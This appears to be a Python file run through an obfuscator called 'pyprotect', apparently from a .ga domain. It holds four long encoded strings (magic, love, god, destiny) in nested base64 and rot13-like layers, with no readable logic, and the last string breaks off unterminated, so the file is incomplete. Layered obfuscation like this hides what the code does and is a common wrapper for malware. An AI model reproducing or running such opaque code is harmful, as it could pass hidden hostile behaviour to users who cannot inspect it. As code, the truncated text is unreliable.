# encoded by pyprotect
# https://keltec-mediaplay.ga/pyprotect

import base64, codecs
magic = 'IyBlbmNvZGVkIGJ5IHB5cHJvdGVjdA0KIyBodHRwczovL2tlbHRlYy1tZWRpYXBsYXkuZ2EvcHlwcm90ZWN0DQoNCmltcG9ydCBiYXNlNjQsIGNvZGVjcw0KbWFnaWMgPSAnPT09U1NVNEVETFpRWFM1RU1aSjRUVFpOSlQ0SVhaUkhIQkxTU1U0RVVaTlFIT05HWEI2WVYyNEdZRFhFVDNBUDRDTk9ENFJMSEJLWVdRWk9GREtLR1M1TkRMWklHMllHQ1RMSUQzVU1UTFlFR1VVTU1MMkFYVzVORERLWVdRWk9GVENTU1RFSFNCNllWNDRHWURYTUczQVA0S1lNRDRSTFFSTVFIT05NU0I2WVY0NEdZRFhLRzNBUDRLT01ENFJMVVpOUUhPTkdYQjZZVjJZR1lEWElEM0FQNENPRUQ0UkxWUk5RSE9SR1dCNllGVFpHWURYR0QzQVA0S05NRDRSTFVSTlFIT1ZNU0I2WVZaNEdZRFhHRDNBUDRLTk1ENFJMVVJOUUhPWk1XQjZZVlpZR1lEWE9DVVFOQlQ1S0dRTUZBSktPQzJZR1lEWE1HM0FQNDJOTUQ0UkxIQktZV1FaT0ZESVdDUUVGSEpPRUQ0UkxaWk5RSE9aTVdCNllWUVpHWURYQURaQVA0MllFRDRSTFZSTlFIT1pHWEI2WUZUWkdZRFhHRzNBUDRDT0VENFJMVlJOUUhPUkdXQjZZRlRaR1lEWEdEM0FQNEtOTUQ0UkxVUk5RSE9WTVNCNllWWjRHWURYR0QzQVA0S05NRDRSTFVSTlFIT1pNV0I2WVZaWUdZRFhPQ1VRTkJUNUtHUU1GQUpLT1NaWUdZRFhTRDNBUDQyTk1ENFJMUlJOUUhPUk1XQjZZVlRBRk1MWU1YU0JFNUJJSVhaVk9TRDVVUVRNR1RCNllWWU1HWURYSVQzQVA0U1pNRDRSTFNaTlFITzVFQUpQQVM0NU5LVENPUzZBUEdDV0NHTkpKTkNOU0VaNEtHRDRNWEJGTVZSUzRHV1ZJVEI0UURZQktaMllJRVo0TkJMNU1VR0JQWlJNWVU0VkkyVFcyR0xKUFpDTVlVRFZKTjNVVUhHSk1JQ1Y2V1I1SkwyM1NXQVJLWVNaR0Y1Rk9aM1lJVUlGT1QyUlNGM0lNTlRTT1g0SkdOSzVDREtaS1pSVEFWR0ZOUlQ2QVZBQlBNRFRHV1lKSk0yWktIMzVOWjMySUZMRkhPQ1VNVjRWSlRaM01XUlJJUktZSUQ0VklMSzVTRUNWTjJLM1FVQk5LSkNTTVY0QlAyU1dLREU1SUpLVEFUQzVJQktVT1VDVkdJS1E0VzJCSkcyVktFRUpKQjJZQVRFTkpSRE1JRUVOTVkzUlVVNEZHRlNNSVVJRkpKS1NRSENSSlZMTUtVSVZJWlRSRVVHRkpLS1YyVUlGSUlLU1NVQ0JLRkszS1VKRklSMlJFVllBSkJDM0FYWUFKUktSU0hESklOS1NVVUtWSlJLUVFVRUZKRkNVT1ZJSkpUS1FDVkNGSVZCNktFRFZJSUtSQ1ZDRlBHU1EyVUVKSlZLVENWQUJKSktTS0VJRklOTFNTVjROS0pLVVNENFpJTUs1Q1REQkcyMjVLVUJGUFlMUjZVRUZHRUNTU0VFNUlLS1JDREM1SkJLVU9FS1ZHWVRTWUdZRlBCQ01JRUVGSkNLVEVGRk5KRktVQ0VYRlBZTFJHVkU1SUVLU1NINFJJUEtTUUVDVklSRFNNRVdKTllEUkVVTE5LSzJTU0RFWklRS1NPVUNCS0ZLM0tVSkZJUjJSRVZZQUpCQzNBWFlBSjJLUVNVQ0pJTkNTUVVGRlBSUlcyRzJCUEYyVFNVRUJKSks2UUhDNUpKQ1NJVUNGT0kyUkNEVkJHSEtRS0Q0SkpIMlVFRkVCTFRDNktVSFZKUUJSNlU0QlBFMlRTRUVSSUZLUVFFQzVLWENTSVVBTk1aVFdXVUM1SUtLM1FVNDVJVUs1Q1RFQkdRQjZNVUE1S0lTUktVQUJKRTJWT0ZFUklUMlVRRUVGS1RDU01FSkZPUVpSVVUyRkdGS1ZTVUlWSVlLTlFVQVJKRkNTS0VOTktRUlJBVkVCSkYyU0NERUZJMktPUVVESklYSzNLVURGSU5UV0dVWUJKSDJTR0ZFRkpSSzZRSERGSURMNlVWRlZJSFNTMkdFRlBIQ1ZLWFlFSlFCTlFIQ0ZJWENTTVVKTktSQlM0V0NGUEpTUUdXNEJKTUs2UUhOSkxQSzZPVUc1S05EUzJVQUJKSUNXT0Y0VklJSzVBRERWTkUyVUtVQjVLSktTV1VHVk4yU1JDWDRWSUZLVFFFQzVJQlNVT1VLRkhZTFNZVVlCR0ZLTUlFNFpJQ0tTQ0ZGSktaQk1JVUNOTVlEUkdWRUZKSUtTU0g0UklQS1NRRUNWSUJDU0lVTDVLSUNSR1ZKQlBGS1VHRkVaSVEyVVFVQ0JLWEtNU1VJRklSS1JDVUVCSkVTTVVWRVJJT0xSUUhERklOQ01TVUtWSlhUUzRXNEFHSFNRQ1VZRUpOMllHVkRKS1pCU1FVRUZJUVpSV1VMRktGQ1dTVVdWSVRLVE9VRVpJSjJST1VZUU9SSlMyVVJGR0VLTUVHNFZJTUs0UVVEVk4ySzNRRUJWSkpDU1dVWUJHMkszWUVZNElCMlVTVUNGS0QzVUtVSlZKWUxTWVVZTktCMlZDRUo1SUJLVENURVJLWkQ2VUVOVklZTFJVVVlCUEoyVENYNEpKRUs2UVhEWktKS1NVRUU1S05EU1VWRU5LSjJSU1hFWklSS1FPSEM1S0pDTVFVQkZPWlRXRVZSQkpCS1ZTRTRGSUoyVlNVQUZJVkI2VVVLRklSUldVVkNGUEhLTUlYNFZJTUQ2UUhDNUpOQ1NNRUZGSUlLU1NWTEZKRTJWT1ZKSkpNS09BRE5CSlJCNk9VWUlLUkpTT1ZDNU9LMlRTRDRSSUZLNVNVQ1ZKRERTSUVCVkpTU1NNVllCSkJTVU9GNDVJRzJVQ1RFVktaM1VPRUNGSllEUldVWUZHRUszSVU0RkpCS1RBVEVGS1RDU1FVTTVLUlJSVVVFQkdJMlRPRzRCSlpLVFFFREpKQkNTSVVGTk1UQ1NPVjJJS0dLU1NYSkZKTVRXR1ZERkpGS01RVUdGSUlDU1FWRUJKQlNRU1VZVUlJMlZPVURCTEoyNU1FSjVLTlRXRVZSQlBIU1NDVTRGSk1ENlFIQzVKTkNTTUVGRklJS1NTVkxGSkUyVjJFNEZKVzJaUUhGSktYQ01PVUxOS1pMUjZVQ0ZLSkNSS0Q0WklISzVTRURWTkNMU0lFS0ZQWUxTQ1ZFRkdHMlJDVTNWSVJSVlFVRUpHRUtNSUVDNU1ZVFJHVUFGR0hTV0dGWVlJUUtTRVZFSkpSTFNRRVdaSlpUUk1VMkJQSjJVNlVKNUlCS05RWENOSlJMTU1FR05NSUNSR1ZKQlBKS1VTVVlZSUcyWlFVQ0JLVENNU1VFRkpSMlJHVllBSkZLUjJFRVJJTlRXMkdFTktYQ01JVUtGSVlUU0VWSEZHSEtRR1ZZVUlYMllTSEQ1SlpENk9FR0ZPVEtRQ0RDQlBFMlVPRkpaSUpLU1FVRVpOWDJSS0VJVk9RSlJDVkE1T0syVEdHRUZJR0s1UVVDUk5LVFVNVUFWSllUV0tWR0ZLQkNTR0c0NUlRUlVDRENGSkhENlFVTVZKWVRSRVVBRlBCS1JPVklCSlkyVkdGREpKSlNVVUVNVk9ZTFJLVUdCSkUyUkdHNEpMTkQ2UVhEWktKS1NVRUU1S05EU01WR0ZQS0tWT0c0SkpSS1NPVUM1SlRLTUlVRTVNWURTU1ZHQkpHS1IyRVlBSk5UV09YRUZMWEs2VVZGRkpZVFNRVkpCSkdTUkNVWUVKSEtUQ1ZDUktKQzZJRU1GT1JSUkNEUkJKRUNXT1ZFRkpMSzRTSEZCTFRDU09VRU5LSktST1VBRktKQ1NDRDQ1SU9MNEFEREZHRUs2SUVLVkpaVFNXVVRCSkdDVU9HNFZJWEtUQ0RDRkpaRDZJVUhOTkkyUllVRUZHRkNTT1ZENUlZS1NPSERSS1gyNU1FWEZHWURST1ZFQkdJMlFDWDRKT'
love = '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'
god = 'YyVUZGR0wzVU1GU1pLWEs2T1hLWktSU1ZLRkxSSVpKUjRFNTVOUkJWNkVGSlBTQ1Q0RVZOS1FLT1dXSUJMRURNQ1ZZRUtRUlU2RUxKTlhDU1VFQ1JLVlNTQURLTktPQ1JFRkRCT0wzVldFVVZLVDJSNFVLRktLU1NLVklaSUdLVktGQ1pJVjJVR0VEQkdVMlM0RUQ1S0tTVklFS1JLVkpWT0ZKWkpRQlZVRjRWS1dDVVlHVzVLRUtPQVRJTktHS1ZFRkJaSVJKVUVFWVpJVVNUS1RWSktWU1RLVklKR1JDTUNWSEpMTUxWSUZKSk5YMkpBUzZBRUUzM09HRjRFTkRUQVREWklYQ01TRVpJTFJLU0dWVEJQS0tTS1hZVUlNVDJBRENKSU5DTVNVS0ZJSktRRVZSRlBGMlRLVUpKSlZLVENWREJKWkI2UVVERk9aVFdVVkNGSklTUU9WRUJKTUs2UUhGQkpQS01PRU1GT1JCU0FETEZLSENSU0RFNUlJS1FDREVOSVRLTU1VSk5LSUNTQ1ZKQkpHQ1VHRkVWSVAyVUNEQzVKRktVU0VLRkhZRFNZRzJGSkZLM01WRVJJVEtTT1VFTkpOS1VDRVhWT1lEUk9WR0JHRkMzWVVJNUlGS05RSEVWSVZMU01FWFZJVENTR1VSQkdKMlJHRkpCSlkyVUFUREJLUkxNS1VJRkpSS1JLVjJBSkJTM0NINEpMWjJWUUhEQktaRDZLVUtGUFlUU1VWWUJKRkNVS1VKWklaS1FDVkVKS1pCNlFVRUZPWkxRMkdMRlBJQ1ZHRkVGSklLU0NEQ1pJVENTS1VITktSQlI2VUxGS0hLVlNFNFJJTEs1Q0RFQkdFQ1NPVUFWSllUV0tWWUFHMkszVVY0NUlKMlVHVkNSTk9LNk1VSEZKSUtRS1VZTktCUzNLRVlBSkNLU09VRU5KWkQ2TUVYNUtIS1I2VUxGR0kyVEdWSjVJREtNUUhFWk5SRDZDRVdKTklLUkdWSkJQRktVR0ZFWklRMlVRVUM1SlRLTUlVSEZQWURSNlUyQUpCS1RDSFlZSU5EUkdWRUpJTkM2VVZLNU1JU1JBVkU1SUZDVUtVV1ZJVEtRQ1ZESktOQzZVVURWT0pDUzRXVkpLRjJRMlU0SkxWMlpRRUZCSk5LNk9FS0ZPVFNST1ZMRktIMlEyRUVSSUZLUUFUREZKQjJSU1VBVkpZVFNNVjRCSklTV1NERTVJRzJZQ1RDSkdXS1VPVUpGUFlMUk1VMkZKR0MzVUdZRUpDS1RRSE5aS0JLTU1FSUZHSTJSSVYyRkdGMlZLVUlGSkVLTlFYQzVJQlNVQ0VXSk5RWlJHVUxGR0kyU0tVREZJUUtPUVVEUktYMlVVVUw1S1IyUklVMkFKS0NUMkVFNUlIMlpRWENGTEZLM1NVSUZQWlRSVVZDRlBGMlVLVVlBSlAyWVFIRDVKTkNTSVVDRklRWlJZR0NCSkoyUU9WRUpKV0s0QVREWklQSzZLVVlRSlJKU1NWQUZLRktTQ0Q0RkpHS1FTSE5WTktENktVQTVLSktTV1VBSktCU1VDREU1SVVLUjJHRUJHQ0xNVUZJRkpTS1FLVUFCR0kyVk9GNFpJUUs2UUVFRktUQ1NNRUlOS0kyUlVVWU5LR0tWR1c0WklNVFZRRURWSUJDU0lVTDVLSUNSR1ZKQkpJS1VHRkVaSVMyVENUREJLQktNU0VZUUlOVFdRVjRBUEkyUkNVRVJJRTJZUUVDTklKSzNRVUZGSklTU1FVQUZQSEtNVVZJSkpWMllHVkQ1SUpDU0lFR0ZJSUNSMkdONUlJS1EyVUpKSlIyVVNIRFZOWURNT0VENUtSU1I2VUM1T0tDM1lFSkZJTUs0Q1RFWk5MRFNPVUI1S1JCU1dVWUpLSFNXS0RFNUlLS1FDVEM1SVozVU9VQ1ZHWURTS1UyRkdJU1dLVUpaSUJLU0VWRTVJQktNSVVDNU1JMlJNVUFGR0pLUVNISlZJVktPUVhFUkpSRE1LVVlRSVlUUkVVRUZLS1NVU0VZWUlRMllFRkQ1S05DTUlVSEZQWURSNlVFQlBFS1NDWEU1SVhLUlFYRFJJTkNTVVVLRlBKU1NVVkVGSkhTM0tYSkpKVEtRT0hENUpWRFNTRVpJTEpDUlFWQTVPRVNRR1dZQUpXS1NBRE5WTkNEU09VQ1ZJVEtTU1U0QlBFU1VTRTRSSVBLNEdWQVpORkNNUUVCRkpIS1NXVTRCSkcyVE9HRVZJUDJVQ0RDNUpaRDZJVUhGSklDUktVQUJKRUszVVZEQkpCS1RHRkZaS1JENlVGTkZKSjJSU1VKTktGQzNRSEpWSU5LTVFIRE5KUkxNS0VOVklaTFJJVUxCR0kyU0NIRUZJMktTU1VESkpYMlVNVU01S1IyUkNVNEFQSUtTQ1hKRklaMlZRRUNOS0oyNU1FR0ZQSVNTVVZBRkdIU1JHRllFSlFSWUdWQzVJVkJTQ1VFRk9KU1JLVVZKS0YyUU9WRUZKTUtNUUhOSkxKMlVRVUpGSlJCUjJVNE5LSDJRQ0Q0QkpPTDRRWEFSTktEU0tFS05NSktTV1VDNUlCU1UyRTQ1SU8zVjJHQ0JHWTNVT0VKRkhZRFNTVVlGUEJLM01WWTRJWjJZU1VDRkpIRDZTRVhGR1lMUktVQU5LS0tWT0c0WklXS1NRRUM1SUJLU0lVTTVLSUNSR1ZFNUlKU1ZTSEVGSVMyVUdGRDVLVkxNUUVaQVBUS1NRVjRBSklDVENIRUpKU1JZRUZFNUtOQzZTRUw1TVlUU0VWTEJHSDJWQ1hKSkpQS1JDVkVSSVZCNk1VRFZPSlNSMkdSRlBIQ1dLRFlBSkxLNlNYRUpLTkNTT0VCRk9ZTFM2VVJCUEsyVDJFRVZJRktRQURFRktYS1NJVUpOS0lDU0NWSkJQS1NXQ0RZNElDS1FHVkVGSkJDNlFVSEZKSUNSS1VBQkpFMlZPRkVSSVQyVVFFRVZLTktVQ0VKVkpZM1I0V1JGR0oyUlNVSVZJVUtTUUVDSkcyS1NJVVlJTFhMUkNVUkJQSVNWU0VZSUxORDVDVERKSUIyVVVVSkZQWURSR1VFQlBFQ1RLWEVSSU8zMkFURFJLVFNVU1VGTktKS1FFVkVGR0gyVFNVV1JJU1IyQURORktWQjZLRVdKTFNLUTJHQ0JQS0NWU1VEUklMS1NTVUFKTEpDU09FS05NUkJSWUdDRktGMlJLREVGSUtLNEFEREZHRVNVUUVLVkpaTFJXVVRCRzJLVVNVRTVJSzJWU1VFUk5JSzZJRUxWSklLUklWSkJKSlMzS0U0VklCSzZTRUVWS1JCU0NFTkZISTJSRVVMVk5GMlJDVVdKTERLNFFVREZKQkNNUVVCNUtKQ1JBVjRCSklLVUdGRVpJUTJVUVhEUktGS01JVUhGSVIyUjRXNEFQRTJTQ0hZUUlSQlJBVENKSUoyNVVVSzVLSFNSQVZFRktHS1NHVllRSURLNkdWRE5JUkI2UUVYRk9ZTFFZR1ZCSkYyVUtVREZJUjJVUUVEWk5UQ1NNRUtWT1JKUk9WQ0ZLSkNSS0Q0VklIS1FRRUNGS1hLU0lVSk5LSUNTQ1ZKQkpHQ1VHRkVWSVAyVUNUQ0pHRUtVS0VLVkdZVFM0V1lGR0lLTUlFNFZJVDJVUVhBNUlUQzZDRUpGSVkzUlVVTEZHSUNNRVdKNUlOS01RWEVaSVZMTU1VWVFJWUxSQ1VSQlAyMlNDVVlJTFNLU1NYRFJLVkxNSVVDRlBZRFJNVlRCUEhDM0FIWVFJUUJSU1VFNUtOU1VVVUtGUFNLUVFVSEZQSENWQ1VFVklSSzZDRE5GSlZCNktVV0JPUUJTQ0RDQlBLQ1ZHRllFSlZLUUFETkJKSkNNT0VNVk9SSlNPVVJGUEUyUUtENFZJTUs1UUVEWk5MRE1PVUJOS1RTU0tWQUJKS0szUVU0NUlVSzVDVEVCR0tETVFVRk5NWUxSQ1ZHRkdIU1dPRkU1SVRLVFNIRjVJQks2TUVYTktJS1JTVUpGR0VLUlNINFJJV0tOUUhDUk5VRFNNRVlZS1lUV0lWQ0ZLSzJTU0U0SkwyS1NTWENaTlIzVU1VRE5OSEJJMkR'
destiny = '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